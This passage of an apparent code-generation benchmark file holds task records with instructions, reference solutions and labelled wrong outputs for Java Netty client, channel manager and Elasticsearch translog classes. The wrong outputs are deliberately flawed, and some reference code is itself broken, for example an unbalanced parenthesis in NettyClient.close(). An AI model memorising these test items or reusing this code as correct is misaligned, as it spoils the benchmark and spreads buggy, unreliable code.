    "Canonical_solution": "import com.netflix.spectator.api.Counter;\nimport com.netflix.spectator.api.Registry;\nimport com.netflix.spectator.impl.AtomicDouble;\nimport io.mantisrx.publish.config.MrePublishConfiguration;\nimport io.mantisrx.publish.internal.metrics.SpectatorUtils;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.DefaultEventLoopGroup;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class HttpEventChannelManager {\n\n    private static final Logger LOG = LoggerFactory.getLogger(HttpEventChannel.class);\n\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final AtomicDouble liveConnections;\n    private final AtomicDouble nettyChannelBufferSize;\n\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup encoderEventLoopGroup;\n    private final Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels;\n\n    public HttpEventChannelManager(\n            Registry registry,\n            MrePublishConfiguration config) {\n\n        this.connectionSuccess =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionSuccess\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.connectionFailure =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionFailure\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.liveConnections =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"liveConnections\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.nettyChannelBufferSize =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"bufferSize\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n\n        this.lowWriteBufferWatermark = config.getLowWriteBufferWatermark();\n        this.highWriteBufferWatermark = config.getHighWriteBufferWatermark();\n\n        this.eventLoopGroup = new NioEventLoopGroup(config.getIoThreads());\n\n        boolean gzipEnabled = config.getGzipEnabled();\n        if (gzipEnabled) {\n            this.encoderEventLoopGroup = new DefaultEventLoopGroup(config.getCompressionThreads());\n        } else {\n            this.encoderEventLoopGroup = null;\n        }\n\n        this.bootstrap = new Bootstrap()\n                .group(this.eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.MESSAGE_SIZE_ESTIMATOR, MantisMessageSizeEstimator.DEFAULT)\n                .option(ChannelOption.WRITE_BUFFER_WATER_MARK,\n                        new WriteBufferWaterMark(\n                                lowWriteBufferWatermark, highWriteBufferWatermark))\n                .handler(new HttpEventChannelInitializer(\n                        registry, config, encoderEventLoopGroup));\n        this.channels = new ConcurrentHashMap<>();\n\n        Runtime.getRuntime().addShutdownHook(new Thread(this.eventLoopGroup::shutdownGracefully));\n    }\n\n    Channel findOrCreate(InetSocketAddress address) {\n        Channel channel = find(address);\n\n        if (channel == null) {\n            LOG.debug(\"creating new channel for {}\", address);\n            ChannelFuture channelFuture = bootstrap.connect(address);\n            channel = channelFuture.channel();\n\n            channels.put(getHostPortString(address), channel);\n\n            channel.closeFuture().addListener(future -> {\n                LOG.debug(\"closing channel for {}\", address);\n                channels.remove(getHostPortString(address));\n                liveConnections.set((double) channels.size());\n            });\n\n            channelFuture.addListener(future -> {\n                if (future.isSuccess()) {\n                    LOG.debug(\"connection success for {}\", address);\n                    connectionSuccess.increment();\n                    liveConnections.set((double) channels.size());\n                } else {\n                    LOG.debug(\"failed to connect to {}\", address);\n                    connectionFailure.increment();\n                }\n            });\n        }\n\n        nettyChannelBufferSize.set(highWriteBufferWatermark - channel.bytesBeforeUnwritable());\n\n        return channel;\n    }\n\n    private Channel find(InetSocketAddress address) {\n        return channels.get(getHostPortString(address));\n    }\n\n    void close(InetSocketAddress address) {\n        Channel channel = find(address);\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    private String getHostPortString(InetSocketAddress address) {\n        return address.getHostString() + ':' + address.getPort();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.util.concurrent.Promise;\nimport org.slf4j.Logger;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.concurrent.atomic.AtomicDouble;\n\npublic class HttpEventChannelManager {\n    private final Logger LOG;\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final AtomicDouble liveConnections;\n    private final AtomicDouble nettyChannelBufferSize;\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup encoderEventLoopGroup;\n    private final Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels = new ConcurrentHashMap<>();\n\n    public HttpEventChannelManager(Registry registry, MrePublishConfiguration config) {\n        this.LOG = null; // Assume injected or initialized via dependency injection\n        this.connectionSuccess = registry.counter(\"connection_success\");\n        this.connectionFailure = registry.counter(\"connection_failure\");\n        this.liveConnections = new AtomicDouble(0);\n        this.nettyChannelBufferSize = new AtomicDouble(0);\n        this.lowWriteBufferWatermark = 32 * 1024;\n        this.highWriteBufferWatermark = 64 * 1024;\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.encoderEventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap()\n                .group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)\n                .option(ChannelOption.WRITE_BUFFER_WATER_MARK,\n                        new WriteBufferWaterMark(lowWriteBufferWatermark, highWriteBufferWatermark))\n                .handler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ch.pipeline().addLast(new ChannelInboundHandlerAdapter());\n                    }\n                });\n    }\n\n    public Channel findOrCreate(InetSocketAddress remoteAddress) {\n        String hostPort = getHostPortString(remoteAddress);\n        return channels.computeIfAbsent(hostPort, k -> connectToServer(k, remoteAddress));\n    }\n\n    public Channel find(InetSocketAddress remoteAddress) {\n        String hostPort = getHostPortString(remoteAddress);\n        return channels.get(hostPort);\n    }\n\n    public void close(InetSocketAddress remoteAddress) {\n        String hostPort = getHostPortString(remoteAddress);\n        Channel channel = channels.remove(hostPort);\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    private Channel connectToServer(String hostPort, InetSocketAddress remoteAddress) {\n        Promise<Channel> promise = eventLoopGroup.next().newPromise();\n        Bootstrap clientBootstrap = new Bootstrap();\n        clientBootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .handler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ch.pipeline().addLast(new ChannelInboundHandlerAdapter());\n                    }\n                });\n\n        ChannelFuture future = clientBootstrap.connect(remoteAddress);\n        future.addListener((ChannelFutureListener) f -> {\n            if (f.isSuccess()) {\n                connectionSuccess.inc();\n                liveConnections.incrementAndGet();\n                channels.put(hostPort, f.channel());\n            } else {\n                connectionFailure.inc();\n                LOG.error(\"Connection failed to {}\", hostPort, f.cause());\n            }\n        });\n        return future.channel();\n    }\n\n    private String getHostPortString(InetSocketAddress address) {\n        return address.getHostString() + \":\" + address.getPort();\n    }\n}\n```"
  },
  {
    "Task_id": 143,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client for HTTP communication, supporting SSL/TLS encryption, chunked content transfer, and asynchronous request/response handling.\n\nClass Description: The NettyClient class establishes and manages TCP connections to a remote server using Netty's asynchronous I/O framework. It handles HTTP requests and responses, supports SSL/TLS encryption, and provides callback mechanisms for asynchronous processing.\n\nAttributes:\n- hostname: String - The target server hostname\n- port: int - The target server port\n- group: EventLoopGroup - Manages client-side I/O threads\n- b: Bootstrap - Configures Netty client behavior\n- responseParts: Queue<HttpObject> - Stores received HTTP response parts\n- callbackInvoked: AtomicBoolean - Tracks callback invocation status\n- communicationHandler: CommunicationHandler - Processes incoming HTTP messages\n- isOpen: AtomicBoolean - Tracks client connection state\n- request: HttpRequest - Current HTTP request being sent\n- content: ChunkedInput<HttpContent> - Optional request content\n- responseFuture: FutureResult<ResponseParts> - Future for response handling\n- callback: Callback<ResponseParts> - Callback for response handling\n- channelConnectFuture: ChannelFuture - Future for channel connection\n- exception: Exception - Stores any encountered exceptions\n- isKeepAlive: boolean - Tracks HTTP keep-alive status\n\nMethods:\n- NettyClient(String, int, SSLFactory) -> void - Constructor that initializes the client with hostname, port, and optional SSL factory\n- sendRequest(HttpRequest, ChunkedInput<HttpContent>, Callback<ResponseParts>) -> Future<ResponseParts> - Sends an HTTP request with optional content and registers a callback\n- close() -> void - Gracefully shuts down the client and releases resources\n- resetState() -> void - Resets internal state for new requests\n- createChannel() -> void - Creates a new channel connection to the server\n- invokeFutureAndCallback(String) -> void - Invokes the response future and callback with results\n- CommunicationHandler (inner class) - Handles incoming HTTP messages and exceptions\n\nInner Classes:\n- CommunicationHandler: SimpleChannelInboundHandler<HttpObject> - Processes HTTP responses and exceptions\n- ResponseParts: static class - Wrapper for HTTP response parts and completion context",
    "Canonical_solution": "import com.github.ambry.commons.SSLFactory;\nimport com.github.ambry.commons.Callback;\nimport com.github.ambry.router.FutureResult;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpObject;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpUtil;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.stream.ChunkedInput;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.ReferenceCountUtil;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.io.Closeable;\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class NettyClient implements Closeable {\n  private final String hostname;\n  private final int port;\n  private final EventLoopGroup group = new NioEventLoopGroup();\n  private final Bootstrap b = new Bootstrap();\n  private final Queue<HttpObject> responseParts = new LinkedList<HttpObject>();\n  private final AtomicBoolean callbackInvoked = new AtomicBoolean(false);\n  private final CommunicationHandler communicationHandler = new CommunicationHandler();\n  private final AtomicBoolean isOpen = new AtomicBoolean(true);\n\n  private HttpRequest request;\n  private ChunkedInput<HttpContent> content;\n  private FutureResult<ResponseParts> responseFuture;\n  private Callback<ResponseParts> callback;\n  private volatile ChannelFuture channelConnectFuture;\n  private volatile Exception exception = null;\n  private volatile boolean isKeepAlive = false;\n\n  public NettyClient(final String hostname, final int port, final SSLFactory sslFactory) throws InterruptedException {\n    this.hostname = hostname;\n    this.port = port;\n    b.group(group).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {\n      @Override\n      public void initChannel(SocketChannel ch) throws Exception {\n        ChannelPipeline pipeline = ch.pipeline();\n        if (sslFactory != null) {\n          pipeline.addLast(\"sslHandler\",\n              new SslHandler(sslFactory.createSSLEngine(hostname, port, SSLFactory.Mode.CLIENT)));\n        }\n        pipeline.addLast(new HttpClientCodec()).addLast(new ChunkedWriteHandler()).addLast(communicationHandler);\n      }\n    });\n    createChannel();\n  }\n\n  public Future<ResponseParts> sendRequest(HttpRequest request, ChunkedInput<HttpContent> content,\n      Callback<ResponseParts> callback) {\n    this.request = request;\n    this.content = content;\n    this.callback = callback;\n    resetState();\n    channelConnectFuture.addListener(new GenericFutureListener<ChannelFuture>() {\n      @Override\n      public void operationComplete(ChannelFuture future) {\n        if (future.isSuccess()) {\n          future.channel().write(request).addListener(new GenericFutureListener<ChannelFuture>() {\n            @Override\n            public void operationComplete(ChannelFuture future) {\n              if (!future.isSuccess()) {\n                exception = (Exception) future.cause();\n                invokeFutureAndCallback(\"WriteResultListener::operationComplete\");\n              }\n            }\n          });\n          if (content != null) {\n            future.channel().write(content).addListener(new GenericFutureListener<ChannelFuture>() {\n              @Override\n              public void operationComplete(ChannelFuture future) {\n                if (!future.isSuccess()) {\n                  exception = (Exception) future.cause();\n                  invokeFutureAndCallback(\"WriteResultListener::operationComplete\");\n                }\n              }\n            });\n          }\n          future.channel().flush();\n        } else {\n          exception = (Exception) future.cause();\n          invokeFutureAndCallback(\"RequestSender::operationComplete\");\n        }\n      }\n    });\n    return responseFuture;\n  }\n\n  @Override\n  public void close() {\n    if (isOpen.compareAndSet(true, false) {\n      group.shutdownGracefully();\n    }\n  }\n\n  private void resetState() {\n    responseFuture = new FutureResult<>();\n    responseParts.clear();\n    exception = null;\n    callbackInvoked.set(false);\n  }\n\n  private void createChannel() throws InterruptedException {\n    channelConnectFuture = b.connect(hostname, port);\n    channelConnectFuture.channel().closeFuture().addListener(new GenericFutureListener<ChannelFuture>() {\n      @Override\n      public void operationComplete(ChannelFuture future) throws InterruptedException {\n        if (isOpen.get()) {\n          createChannel();\n        }\n        invokeFutureAndCallback(\"ChannelCloseListener::operationComplete\");\n      }\n    });\n  }\n\n  private void invokeFutureAndCallback(String completionContext) {\n    if (callbackInvoked.compareAndSet(false, true)) {\n      responseFuture.done(new ResponseParts(responseParts, completionContext), exception);\n      if (callback != null) {\n        callback.onCompletion(new ResponseParts(responseParts, completionContext), exception);\n      }\n    }\n  }\n\n  @ChannelHandler.Sharable\n  private class CommunicationHandler extends SimpleChannelInboundHandler<HttpObject> {\n    @Override\n    public void channelRead0(ChannelHandlerContext ctx, HttpObject in) {\n      responseParts.offer(ReferenceCountUtil.retain(in));\n      if (in instanceof HttpResponse && in.decoderResult().isSuccess()) {\n        isKeepAlive = HttpUtil.isKeepAlive((HttpResponse) in);\n      } else if (in.decoderResult().isFailure()) {\n        Throwable cause = in.decoderResult().cause();\n        if (cause instanceof Exception) {\n          exception = (Exception) cause;\n        } else {\n          exception =\n              new Exception(\"Encountered Throwable when trying to decode response. Message: \" + cause.getMessage());\n        }\n        invokeFutureAndCallback(\"CommunicationHandler::channelRead0 - decoder failure\");\n      }\n      if (in instanceof LastHttpContent) {\n        if (isKeepAlive) {\n          invokeFutureAndCallback(\"CommunicationHandler::channelRead0 - last content\");\n        } else {\n          ctx.close();\n        }\n      }\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n      ctx.close();\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n      if (cause instanceof Exception) {\n        exception = (Exception) cause;\n        ctx.close();\n      } else {\n        ctx.fireExceptionCaught(cause);\n      }\n    }\n  }\n\n  public static class ResponseParts {\n    public final Queue<HttpObject> queue;\n    public final String completionContext;\n\n    private ResponseParts(Queue<HttpObject> queue, String completionContext) {\n      this.queue = queue;\n      this.completionContext = completionContext;\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.util.CharsetUtil;\nimport io.netty.util.concurrent.DefaultPromise;\nimport io.netty.util.concurrent.Future;\nimport io.netty.util.concurrent.GenericFutureListener;\n\nimport javax.net.ssl.SSLEngine;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Queue;\nimport java.util.concurrent.*;\n\npublic class NettyClient {\n    private final String hostname;\n    private final int port;\n    private final EventLoopGroup group;\n    private final Bootstrap b;\n    private final Queue<HttpObject> responseParts;\n    private final AtomicBoolean callbackInvoked;\n    private final CommunicationHandler communicationHandler;\n    private final AtomicBoolean isOpen;\n    private HttpRequest request;\n    private ChunkedInput<HttpContent> content;\n    private FutureResult<ResponseParts> responseFuture;\n    private Callback<ResponseParts> callback;\n    private ChannelFuture channelConnectFuture;\n    private Exception exception;\n    private boolean isKeepAlive;\n    private SslContext sslContext;\n\n    public NettyClient(String hostname, int port, SSLFactory sslFactory) {\n        this.hostname = hostname;\n        this.port = port;\n        this.group = new NioEventLoopGroup();\n        this.b = new Bootstrap();\n        this.responseParts = new ConcurrentLinkedQueue<>();\n        this.callbackInvoked = new AtomicBoolean(false);\n        this.isOpen = new AtomicBoolean(true);\n        this.communicationHandler = new CommunicationHandler();\n        if (sslFactory != null) {\n            try {\n                this.sslContext = sslFactory.createSSLContext();\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to create SSL context\", e);\n            }\n        }\n        configureBootstrap();\n    }\n\n    private void configureBootstrap() {\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .handler(new ChannelInitializer<NioSocketChannel>() {\n             @Override\n             protected void initChannel(NioSocketChannel ch) throws Exception {\n                 ChannelPipeline pipeline = ch.pipeline();\n                 if (sslContext != null) {\n                     SSLEngine engine = sslContext.newEngine(ch.alloc(), hostname, port);\n                     engine.setUseClientMode(true);\n                     pipeline.addLast(\"ssl\", new SslHandler(engine));\n                 }\n                 pipeline.addLast(\"http\", new HttpClientCodec());\n                 pipeline.addLast(\"aggregator\", new HttpObjectAggregator(1048576));\n                 pipeline.addLast(\"handler\", communicationHandler);\n             }\n         });\n    }\n\n    public Future<ResponseParts> sendRequest(HttpRequest request, ChunkedInput<HttpContent> content, Callback<ResponseParts> callback) {\n        this.request = request;\n        this.content = content;\n        this.callback = callback;\n        resetState();\n        createChannel();\n        return responseFuture;\n    }\n\n    public void close() {\n        isOpen.set(false);\n        if (channelConnectFuture != null && channelConnectFuture.channel() != null) {\n            channelConnectFuture.channel().close();\n        }\n        group.shutdownGracefully();\n    }\n\n    private void resetState() {\n        responseParts.clear();\n        callbackInvoked.set(false);\n        responseFuture = new FutureResult<>();\n        exception = null;\n        isKeepAlive = true;\n    }\n\n    private void createChannel() {\n        channelConnectFuture = b.connect(new InetSocketAddress(hostname, port));\n        channelConnectFuture.addListener((GenericFutureListener<ChannelFuture>) future -> {\n            if (future.isSuccess()) {\n                Channel channel = future.channel();\n                channel.writeAndFlush(request);\n                if (content != null) {\n                    channel.writeAndFlush(content);\n                }\n                channel.writeAndFlush(LastHttpContent.EMPTY_LAST_CONTENT);\n            } else {\n                handleFailure(future.cause());\n            }\n        });\n    }\n\n    private void invokeFutureAndCallback(String reason) {\n        if (callbackInvoked.compareAndSet(false, true)) {\n            ResponseParts parts = new ResponseParts(responseParts, reason);\n            responseFuture.setSuccess(parts);\n            if (callback != null) {\n                callback.onResponse(parts);\n            }\n        }\n    }\n\n    private void handleFailure(Throwable cause) {\n        exception = new Exception(cause);\n        invokeFutureAndCallback(\"Connection failed\");\n    }\n\n    private class CommunicationHandler extends SimpleChannelInboundHandler<HttpObject> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n            if (msg instanceof HttpResponse) {\n                HttpResponse response = (HttpResponse) msg;\n                isKeepAlive = HttpHeaders.Values.KEEP_ALIVE.equalsIgnoreCase(\n                        response.headers().get(HttpHeaderNames.CONNECTION));\n            }\n            responseParts.add(msg);\n\n            if (msg instanceof LastHttpContent) {\n                invokeFutureAndCallback(\"Response received\");\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            handleFailure(cause);\n            ctx.close();\n        }\n    }\n\n    public static class FutureResult<T> extends DefaultPromise<T> {\n        public FutureResult() {\n            super(GlobalEventExecutor.INSTANCE);\n        }\n    }\n\n    public interface SSLFactory {\n        SslContext createSSLContext() throws Exception;\n    }\n\n    public interface Callback<T> {\n        void onResponse(T result);\n    }\n\n    public static class ResponseParts {\n        private final Queue<HttpObject> parts;\n        private final String completionReason;\n\n        public ResponseParts(Queue<HttpObject> parts, String completionReason) {\n            this.parts = parts;\n            this.completionReason = completionReason;\n        }\n\n        public Queue<HttpObject> getParts() {\n            return parts;\n        }\n\n        public String getCompletionReason() {\n            return completionReason;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 16,
    "Instruction": "Task Description: Create a Java class that implements a transactional log writer for Elasticsearch, handling file operations using Java NIO's FileChannel for efficient I/O operations. The class should manage writing operations, buffer management, and resource cleanup.\n\nClass Description: TranslogWriter is a transactional log writer that extends BaseTranslogReader and implements Closeable. It provides functionality to write operations to a log file using FileChannel, manage buffers, and handle synchronization. The class includes mechanisms for checkpointing, thread-safe operations, and resource management.\n\nAttributes:\n- channel: [FileChannel] - The main file channel for writing transaction log entries\n- checkpointChannel: [FileChannel] - File channel for writing checkpoint information\n- checkpointPath: [Path] - Path to the checkpoint file\n- bigArrays: [BigArrays] - Helper for managing large arrays\n- totalOffset: [long] - Current offset in the log file\n- closed: [AtomicBoolean] - Flag indicating whether the writer is closed\n- writeLock: [ReleasableLock] - Lock for thread-safe write operations\n- syncLock: [Object] - Synchronization lock object\n- buffer: [ReleasableBytesStreamOutput] - Buffer for holding data before writing\n- globalCheckpointSupplier: [LongSupplier] - Supplier for global checkpoint information\n- minTranslogGenerationSupplier: [LongSupplier] - Supplier for minimum translog generation\n- persistedSequenceNumberConsumer: [LongConsumer] - Consumer for persisted sequence numbers\n\nMethods:\n- TranslogWriter([ShardId, Checkpoint, FileChannel, FileChannel, Path, Path, ByteSizeValue, LongSupplier, LongSupplier, TranslogHeader, TragicExceptionHolder, LongConsumer, BigArrays]) -> [void] - Constructor that initializes the translog writer with all required components\n- writeAndReleaseOps([ReleasableBytesReference]) -> [void] - Writes the given bytes reference to the file and releases it\n- writeToFile([ByteBuffer]) -> [void] - Helper method that writes buffer contents to the file channel\n- readBytes([ByteBuffer, long]) -> [void] - Reads bytes from the specified position into the target buffer\n- writeCheckpoint([FileChannel, Path, Checkpoint]) -> [void] - Static helper method to write checkpoint information\n- close() -> [void] - Closes all resources and marks the writer as closed",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.function.LongConsumer;\nimport java.util.function.LongSupplier;\n\nimport org.apache.lucene.store.AlreadyClosedException;\nimport org.apache.lucene.util.BytesRef;\nimport org.apache.lucene.util.BytesRefIterator;\nimport org.elasticsearch.common.bytes.BytesArray;\nimport org.elasticsearch.common.bytes.BytesReference;\nimport org.elasticsearch.common.bytes.ReleasableBytesReference;\nimport org.elasticsearch.common.io.Channels;\nimport org.elasticsearch.common.io.DiskIoBufferPool;\nimport org.elasticsearch.common.lease.Releasables;\nimport org.elasticsearch.common.unit.ByteSizeValue;\nimport org.elasticsearch.common.util.BigArrays;\nimport org.elasticsearch.common.util.concurrent.ReleasableLock;\nimport org.elasticsearch.index.seqno.SequenceNumbers;\nimport org.elasticsearch.index.shard.ShardId;\n\nimport io.crate.common.SuppressForbidden;\nimport io.crate.common.io.IOUtils;\n\npublic class TranslogWriter extends BaseTranslogReader implements Closeable {\n\n    private final FileChannel channel;\n    private final FileChannel checkpointChannel;\n    private final Path checkpointPath;\n    private final BigArrays bigArrays;\n    private volatile long totalOffset;\n    private final AtomicBoolean closed = new AtomicBoolean(false);\n    private final ReleasableLock writeLock = new ReleasableLock(new ReentrantLock());\n    private final Object syncLock = new Object();\n    private ReleasableBytesStreamOutput buffer;\n    private final LongSupplier globalCheckpointSupplier;\n    private final LongSupplier minTranslogGenerationSupplier;\n    private final LongConsumer persistedSequenceNumberConsumer;\n\n    public TranslogWriter(\n        final ShardId shardId,\n        final Checkpoint initialCheckpoint,\n        final FileChannel channel,\n        final FileChannel checkpointChannel,\n        final Path path,\n        final Path checkpointPath,\n        final ByteSizeValue bufferSize,\n        final LongSupplier globalCheckpointSupplier,\n        LongSupplier minTranslogGenerationSupplier,\n        TranslogHeader header,\n        final TragicExceptionHolder tragedy,\n        final LongConsumer persistedSequenceNumberConsumer,\n        final BigArrays bigArrays) throws IOException {\n        super(initialCheckpoint.generation, channel, path, header);\n        this.channel = channel;\n        this.checkpointChannel = checkpointChannel;\n        this.checkpointPath = checkpointPath;\n        this.bigArrays = bigArrays;\n        this.totalOffset = initialCheckpoint.offset;\n        this.globalCheckpointSupplier = globalCheckpointSupplier;\n        this.minTranslogGenerationSupplier = minTranslogGenerationSupplier;\n        this.persistedSequenceNumberConsumer = persistedSequenceNumberConsumer;\n    }\n\n    private void writeAndReleaseOps(ReleasableBytesReference toWrite) throws IOException {\n        try (ReleasableBytesReference toClose = toWrite) {\n            assert writeLock.isHeldByCurrentThread();\n            ByteBuffer ioBuffer = DiskIoBufferPool.getIoBuffer();\n\n            BytesRefIterator iterator = toWrite.iterator();\n            BytesRef current;\n            while ((current = iterator.next()) != null) {\n                int currentBytesConsumed = 0;\n                while (currentBytesConsumed != current.length) {\n                    int nBytesToWrite = Math.min(current.length - currentBytesConsumed, ioBuffer.remaining());\n                    ioBuffer.put(current.bytes, current.offset + currentBytesConsumed, nBytesToWrite);\n                    currentBytesConsumed += nBytesToWrite;\n                    if (ioBuffer.hasRemaining() == false) {\n                        ioBuffer.flip();\n                        writeToFile(ioBuffer);\n                        ioBuffer.clear();\n                    }\n                }\n            }\n            ioBuffer.flip();\n            writeToFile(ioBuffer);\n        }\n    }\n\n    @SuppressForbidden(reason = \"Channel#write\")\n    private void writeToFile(ByteBuffer ioBuffer) throws IOException {\n        while (ioBuffer.remaining() > 0) {\n            channel.write(ioBuffer);\n        }\n    }\n\n    @Override\n    protected void readBytes(ByteBuffer targetBuffer, long position) throws IOException {\n        try {\n            if (position + targetBuffer.remaining() > getWrittenOffset()) {\n                writeBufferedOps(position + targetBuffer.remaining(), true);\n            }\n        } catch (final Exception ex) {\n            closeWithTragicEvent(ex);\n            throw ex;\n        }\n        Channels.readFromFileChannelWithEofException(channel, position, targetBuffer);\n    }\n\n    private static void writeCheckpoint(\n        final FileChannel fileChannel,\n        final Path checkpointFile,\n        final Checkpoint checkpoint) throws IOException {\n        Checkpoint.write(fileChannel, checkpointFile, checkpoint);\n    }\n\n    @Override\n    public final void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            synchronized (this) {\n                Releasables.closeIgnoringException(buffer);\n                buffer = null;\n            }\n            IOUtils.close(checkpointChannel, channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport org.elasticsearch.index.shard.ShardId;\nimport org.elasticsearch.index.translog.Checkpoint;\nimport org.elasticsearch.index.translog.TranslogHeader;\nimport org.elasticsearch.index.translog.TragicExceptionHolder;\nimport org.elasticsearch.common.bytes.ReleasableBytesReference;\nimport org.elasticsearch.common.util.BigArrays;\nimport org.elasticsearch.common.util.ReleasableLock;\nimport org.elasticsearch.common.util.concurrent.ReleasableBytesStreamOutput;\n\npublic class TranslogWriter extends BaseTranslogReader implements Closeable {\n\n    private final FileChannel channel;\n    private final FileChannel checkpointChannel;\n    private final Path checkpointPath;\n    private final BigArrays bigArrays;\n    private long totalOffset;\n    private final AtomicBoolean closed = new AtomicBoolean(false);\n    private final ReleasableLock writeLock;\n    private final Object syncLock = new Object();\n    private ReleasableBytesStreamOutput buffer;\n    private final LongSupplier globalCheckpointSupplier;\n    private final LongSupplier minTranslogGenerationSupplier;\n    private final LongConsumer persistedSequenceNumberConsumer;\n\n    public TranslogWriter(ShardId shardId, Checkpoint initialCheckpoint, FileChannel channel, FileChannel checkpointChannel,\n                          Path translogPath, Path checkpointPath, ByteSizeValue maxOperations, LongSupplier globalCheckpointSupplier,\n                          LongSupplier minTranslogGenerationSupplier, TranslogHeader header, TragicExceptionHolder tragicExceptionHolder,\n                          LongConsumer persistedSequenceNumberConsumer, BigArrays bigArrays) throws IOException {\n        super(shardId, initialCheckpoint, translogPath, maxOperations, header, tragicExceptionHolder);\n        this.channel = channel;\n        this.checkpointChannel = checkpointChannel;\n        this.checkpointPath = checkpointPath;\n        this.bigArrays = bigArrays;\n        this.globalCheckpointSupplier = globalCheckpointSupplier;\n        this.minTranslogGenerationSupplier = minTranslogGenerationSupplier;\n        this.persistedSequenceNumberConsumer = 